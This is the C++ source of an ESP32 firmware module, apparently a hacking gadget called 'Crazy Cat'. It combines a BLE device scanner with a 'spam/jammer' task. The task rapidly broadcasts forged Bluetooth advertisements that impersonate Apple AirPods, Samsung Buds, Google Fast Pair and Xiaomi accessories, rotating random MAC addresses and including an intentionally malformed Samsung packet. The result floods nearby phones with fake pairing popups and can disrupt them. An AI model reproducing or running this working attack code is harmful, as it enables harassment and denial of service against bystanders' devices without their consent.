// ============================================================
// bluetooth.cpp - Crazy Cat v3.1
// BLE Scan + BLE Spam (Audited & Verified Payloads)
// ============================================================

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEServer.h>
#include "config.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

void stopBTJammer();
void stopBTScan();

static bool bleInitialized = false;
static BLEScan* pBLEScan = nullptr;
static BLEServer* pServer = nullptr;
static TaskHandle_t btScanTaskHandle = nullptr;
static TaskHandle_t btJammerTaskHandle = nullptr;
static volatile bool btScanActive = false;

// ============================================================
// BLE SCAN CALLBACK
// ============================================================
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        if (btDeviceCount >= MAX_BT_DEVICES) return;
        
        std::string addrStr = advertisedDevice.getAddress().toString();
        unsigned int a0, a1, a2, a3, a4, a5;
        if (sscanf(addrStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x", &a0, &a1, &a2, &a3, &a4, &a5) != 6) return;
        
        uint8_t mac[6] = {(uint8_t)a0, (uint8_t)a1, (uint8_t)a2, (uint8_t)a3, (uint8_t)a4, (uint8_t)a5};

        for (int i = 0; i < btDeviceCount; i++) {
            if (memcmp(btDevices[i].address, mac, 6) == 0) return;
        }

        memcpy(btDevices[btDeviceCount].address, mac, 6);
        btDevices[btDeviceCount].rssi = advertisedDevice.getRSSI();
        
        if (advertisedDevice.haveName()) {
            strncpy(btDevices[btDeviceCount].name, advertisedDevice.getName().c_str(), 31);
        } else {
            strncpy(btDevices[btDeviceCount].name, addrStr.c_str(), 31);
        }
        btDevices[btDeviceCount].name[31] = '\0';
        
        btDeviceCount++;
    }
};

static MyAdvertisedDeviceCallbacks* pScanCallbacks = nullptr;

// ============================================================
// BLE SCAN TASK
// ============================================================
void btScanTask(void *pvParameters) {
    btScanActive = true;
    Serial.println("[BT] >>> SCAN START <<<");

    BLEDevice::getAdvertising()->stop();
    vTaskDelay(300 / portTICK_PERIOD_MS);

    if (!pBLEScan) pBLEScan = BLEDevice::getScan();
    pBLEScan->stop();
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pBLEScan->clearResults();
    
    pBLEScan->setAdvertisedDeviceCallbacks(pScanCallbacks, true);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(0x50);  
    pBLEScan->setWindow(0x50);    

    Serial.printf("[BT] Scanning 15s... heap:%u\n", esp_get_free_heap_size());
    Serial.flush();

    pBLEScan->start(15, false);
    
    Serial.printf("[BT] Scan done. Devices found: %d\n", btDeviceCount);
    pBLEScan->clearResults();
    
    if (btDeviceCount == 0) {
        Serial.println("[BT] 0 devices found.");
    }

    btScanActive = false;
    btScanTaskHandle = nullptr;
    Serial.println("[BT] >>> SCAN END <<<");
    vTaskDelete(NULL);
}

// ============================================================
// SPAM PAYLOAD BUILDERS (AUDITED)
// ============================================================

static const uint16_t apple_models[] = {
    0x0E20, // AirPods Pro
    0x1320, // AirPods 3
    0x0F20, // AirPods 2
    0x0A20, // AirPods Max
    0x0B20  // Beats Powerbeats Pro
};
static const uint8_t apple_model_count = sizeof(apple_models) / sizeof(apple_models[0]);

static const uint8_t fastpair_ids[][3] = {
    {0x00, 0xB7, 0x27}, // Pixel Buds
    {0x05, 0xA9, 0x63}, // JBL Diverge
    {0x05, 0x77, 0xB1}, // Motorola VerveBuds
    {0x05, 0xC4, 0x52}, // JBL Endurance
    {0x06, 0x60, 0xD7}, // JBL Reflect
    {0x00, 0x5E, 0xF9}  // Sony WH-1000XM4
};
static const uint8_t fp_id_count = sizeof(fastpair_ids) / sizeof(fastpair_ids[0]);

// 1. Apple Proximity Pair (31 bytes)
static void buildApplePkt(uint8_t* buf, uint8_t& len, uint32_t cnt) {
    uint16_t model = apple_models[cnt % apple_model_count];
    uint8_t i = 0;
    buf[i++] = 0x1E; // Tamanho (30 bytes de payload)
    buf[i++] = 0xFF; // Tipo (Manufacturer Specific Data)
    buf[i++] = 0x4C; // Apple Company ID (0x004C)
    buf[i++] = 0x00;
    buf[i++] = 0x07; // Continuity Type (ProximityPair)
    buf[i++] = 0x19; // Continuity Payload Length (25)
    buf[i++] = 0x07; // Prefix (New Device)
    buf[i++] = (uint8_t)(model >> 8);   
    buf[i++] = (uint8_t)(model & 0xFF); 
    buf[i++] = 0x55; // Status
    esp_fill_random(&buf[i], 3); i += 3; // Random Battery
    buf[i++] = 0x00; // Color
    buf[i++] = 0x00; // Reserved
    esp_fill_random(&buf[i], 16); i += 16; // Random Tail
    len = i; // Total: 31 bytes
}

// 2. Samsung Buds (31 bytes com trailer malformado intencional)
static void buildSamsungPkt(uint8_t* buf, uint8_t& len) {
    uint8_t i = 0;
    buf[i++] = 0x1B; // Tamanho (27 bytes)
    buf[i++] = 0xFF; // Tipo (Manufacturer)
    buf[i++] = 0x75; // Samsung Company ID (0x0075)
    buf[i++] = 0x00;
    buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
    buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
    buf[i++] = 0x01; buf[i++] = 0x09; buf[i++] = 0xEE; buf[i++] = 0x7A;
    buf[i++] = 0x01; buf[i++] = 0x0C; buf[i++] = 0x06; buf[i++] = 0x3C;
    buf[i++] = 0x94; buf[i++] = 0x8E; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0xC7; buf[i++] = 0x00;
    buf[i++] = 0x10; buf[i++] = 0xFF; buf[i++] = 0x75; // Trailer
    len = i; // Total: 31 bytes
}

// 3. Google Fast Pair (15 bytes - Estrutura Oficial)
static void buildGooglePkt(uint8_t* buf, uint8_t& len, uint32_t cnt) {
    uint8_t fp_idx = cnt % fp_id_count;
    uint8_t i = 0;
    // AD Structure 1: Complete List of 16-bit Service UUIDs (0xFE2C)
    buf[i++] = 0x03; // Tamanho (3 bytes)
    buf[i++] = 0x03; // Tipo (Complete 16-bit UUID)
    buf[i++] = 0x2C; // UUID 0xFE2C (Little Endian)
    buf[i++] = 0xFE;
    
    // AD Structure 2: Service Data (UUID + Model ID)
    buf[i++] = 0x06; // Tamanho (6 bytes)
    buf[i++] = 0x16; // Tipo (Service Data)
    buf[i++] = 0x2C; // UUID 0xFE2C (Little Endian)
    buf[i++] = 0xFE;
    buf[i++] = fastpair_ids[fp_idx][0]; // Model ID 1
    buf[i++] = fastpair_ids[fp_idx][1]; // Model ID 2
    buf[i++] = fastpair_ids[fp_idx][2]; // Model ID 3
    
    // AD Structure 3: TX Power Level
    buf[i++] = 0x02; // Tamanho (2 bytes)
    buf[i++] = 0x0A; // Tipo (TX Power)
    buf[i++] = 0x00; // 0 dBm
    
    len = i; // Total: 15 bytes
}

// 4. Xiaomi / Redmi (28 bytes)
static void buildXiaomiPkt(uint8_t* buf, uint8_t& len) {
    uint8_t i = 0;
    buf[i++] = 0x1B; // Tamanho (27 bytes de payload)
    buf[i++] = 0xFF; // Tipo (Manufacturer)
    buf[i++] = 0x8F; // Xiaomi Company ID (0x038F)
    buf[i++] = 0x03;
    buf[i++] = 0x16; buf[i++] = 0x01; buf[i++] = 0x20;
    esp_fill_random(&buf[i], 2); i += 2;
    buf[i++] = 0x17; buf[i++] = 0x0A; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x88; buf[i++] = 0x50;
    buf[i++] = 0x11; buf[i++] = 0xB1; buf[i++] = 0xFF;
    esp_fill_random(&buf[i], 2); i += 2;
    memset(&buf[i], 0, 6); i += 6; // Suffix de 6 bytes
    len = i; // Total: 28 bytes
}

// ============================================================
// BLE JAMMER TASK
// ============================================================
void btJammerTask(void *pvParameters) {
    Serial.println("[BT] Spam started (Audited Payloads)");
    BLEAdvertising* pAdv = pServer->getAdvertising();
    
    uint8_t st=0; uint32_t cnt=0;

    pAdv->setMinInterval(0x20); 
    pAdv->setMaxInterval(0x20);
    pAdv->setMinPreferred(0x20);
    pAdv->setMaxPreferred(0x20);
    pAdv->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    
    while (btJammerActive) {
        // 1. Gera MAC Aleatório (Static Random)
        esp_bd_addr_t dummy_addr;
        for (int i = 0; i < 6; i++) dummy_addr[i] = random(256);
        dummy_addr[0] |= 0xC0; // Bits superiores como 11 (Static Random)
        pAdv->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);

        // 2. Monta o pacote bruto
        uint8_t pkt_buf[31]; 
        uint8_t pkt_len = 0;

        st = (st + 1) % 4; 
        
        if (st == 0) {
            buildApplePkt(pkt_buf, pkt_len, cnt);
        } else if (st == 1) {
            buildSamsungPkt(pkt_buf, pkt_len);
        } else if (st == 2) {
            buildGooglePkt(pkt_buf, pkt_len, cnt);
        } else {
            buildXiaomiPkt(pkt_buf, pkt_len);
        }

        // 3. Injeta os bytes direto no rádio
        BLEAdvertisementData oAdvertisementData;
        oAdvertisementData.addData(std::string((char*)pkt_buf, pkt_len));
        pAdv->setAdvertisementData(oAdvertisementData);

        // 4. Dispara o pacote
        pAdv->start();
        
        // 40ms: Garante que o rádio transmita o pacote nos 3 canais (37, 38, 39)
        // Com intervalo de 20ms, o pacote é transmitido 2 vezes por canal.
        vTaskDelay(40 / portTICK_PERIOD_MS); 
        
        pAdv->stop();
        
        // 5ms: Yield para o processador limpar a fila de eventos do BLE
        // Sem isso, o stack do Bluedroid enche e começa a descartar pacotes.
        vTaskDelay(5 / portTICK_PERIOD_MS);

        cnt++;
        if(cnt%20==0) Serial.printf("[BT] Spam cycles:%lu\n",cnt);
    }
    
    pAdv->stop();
    btJammerTaskHandle=nullptr;
    vTaskDelete(NULL);
}

// ============================================================
// bluetoothInit
// ============================================================
bool bluetoothInit() {
    if (bleInitialized) return true;

    Serial.println("\n[BT] ==============================");
    Serial.println("[BT] BLE INIT");
    Serial.flush();

    BLEDevice::init("CrazyCat");
    
    pServer = BLEDevice::createServer();
    Serial.println("[BT] BLEServer created");
    
    pBLEScan = BLEDevice::getScan();
    if (pBLEScan == nullptr) {
        Serial.println("[BT] FAILED: getScan null");
        return false;
    }
    
    pScanCallbacks = new MyAdvertisedDeviceCallbacks();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(0x50);
    pBLEScan->setWindow(0x50);

    bleInitialized = true;
    Serial.printf("[BT] Heap after init: %u\n", esp_get_free_heap_size());
    Serial.println("[BT] ======= BLE INIT OK =======\n");
    Serial.flush();
    return true;
}

// ============================================================
// PUBLIC FUNCTIONS
// ============================================================
void startBTScan() {
    if (!bleInitialized) {
        if (!bluetoothInit()) return;
    }
    if (btJammerActive) stopBTJammer();
    btDeviceCount = 0;
    xTaskCreatePinnedToCore(btScanTask, "BTScan", 16384, NULL, 1, &btScanTaskHandle, 0);
}

void stopBTScan() {
    if (pBLEScan && btScanActive) pBLEScan->stop();
    btScanActive = false;
}

bool isBTScanning() { return btScanActive; }
uint8_t getBTDeviceCount() { return btDeviceCount; }
BTDevice* getBTDevice(uint8_t i) { return (i<btDeviceCount) ? &btDevices[i] : nullptr; }

void startBTJammer(uint8_t idx) {
    (void)idx;
    if (btJammerActive) return;
    if (btScanActive) stopBTScan();
    if (btScanTaskHandle) vTaskDelay(200 / portTICK_PERIOD_MS);
    if (!bleInitialized) {
        if (!bluetoothInit()) return;
    }
    btJammerActive = true;
    xTaskCreatePinnedToCore(btJammerTask, "BTJam", 8192, NULL, 2, &btJammerTaskHandle, 0);
    Serial.println("[BT] Jammer started");
}

void stopBTJammer() {
    if (!btJammerActive) return;
    btJammerActive = false;
    vTaskDelay(50 / portTICK_PERIOD_MS);
    if (bleInitialized) BLEDevice::getAdvertising()->stop();
    btJammerTaskHandle = nullptr;
    Serial.println("[BT] Jammer stopped");
}

void disconnectBTDevice(uint8_t) {}
bool isBLEAvailable() { return bleInitialized; }
